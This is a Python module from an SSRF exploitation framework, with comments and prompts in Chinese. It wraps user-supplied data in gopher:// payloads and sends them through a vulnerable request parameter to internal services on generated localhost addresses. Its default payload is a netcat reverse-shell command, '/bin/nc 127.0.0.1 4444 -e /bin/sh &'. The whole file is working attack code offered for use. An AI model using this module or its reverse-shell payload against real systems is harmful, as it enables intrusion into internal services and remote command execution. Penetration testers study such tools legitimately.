import logging
import urllib.parse

from core.utils import *

name = "custom"
description = "向监听服务（例如 netcat）发送自定义数据"
author = "Swissky"
documentation = []


class exploit:
    SERVICE_IP = "127.0.0.1"
    SERVICE_PORT = "8080"
    SERVICE_DATA = "/bin/nc 127.0.0.1 4444 -e /bin/sh &"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        gen_hosts = gen_ip_list("127.0.0.1", args.level)
        self.SERVICE_PORT = input("服务端口: ")
        self.SERVICE_DATA = "%0d%0a" + urllib.parse.quote(input("服务数据: "))

        for gen_host in gen_hosts:
            payload = wrapper_gopher(self.SERVICE_DATA, gen_host, self.SERVICE_PORT)

            if args.verbose == True:
                logging.info(f"生成的 payload : {payload}")

            r = requester.do_request(args.param, payload)

            if args.verbose == True:
                logging.info(f"模块 '{name}' 已结束！")
